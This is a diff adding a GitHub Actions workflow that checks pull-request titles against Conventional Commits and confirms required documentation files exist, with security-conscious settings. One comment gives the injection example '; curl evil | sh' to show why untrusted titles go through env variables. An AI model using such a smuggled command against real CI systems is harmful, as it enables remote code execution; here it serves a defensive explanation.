@@ -1,0 +1,45 @@
+# Phase 1 placeholder check. Gives the ruleset a real *required status check*
+# to enforce. Phase 6 replaces this with full CI.
+name: pr-hygiene
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, edited, synchronize, reopened]   # 'edited' re-runs when the title changes
+
+# Least privilege: the GITHUB_TOKEN for this run can only read repo contents.
+permissions:
+  contents: read
+
+# A newer push to the same PR cancels the older run (saves minutes, avoids stale results).
+concurrency:
+  group: pr-hygiene-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  pr-hygiene:                  # <- this job id is the check name the ruleset requires
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Check out
+        uses: actions/checkout@v4
+
+      - name: PR title follows Conventional Commits
+        # Pass untrusted input (the PR title) via env, never inline ${{ }} inside `run:`,
+        # otherwise a title like  "; curl evil | sh"  becomes shell code (script injection).
+        env:
+          TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          echo "PR title: $TITLE"
+          if ! printf '%s' "$TITLE" | grep -Eq '^(feat|fix|docs|chore|ci|refactor|test|perf|build|revert)(\([a-z0-9-]+\))?!?: .+'; then
+            echo "::error title=PR title::Use Conventional Commits, e.g. 'feat(api): add /ready endpoint'"
+            exit 1
+          fi
+
+      - name: Required learning docs exist
+        run: |
+          missing=0
+          for f in README.md LEARNING.md BREAK-FIX-LOG.md REVIEW-CHECKLIST.md .github/CODEOWNERS; do
+            [ -f "$f" ] || { echo "::error file=$f::missing required file"; missing=1; }
+          done
+          exit $missing
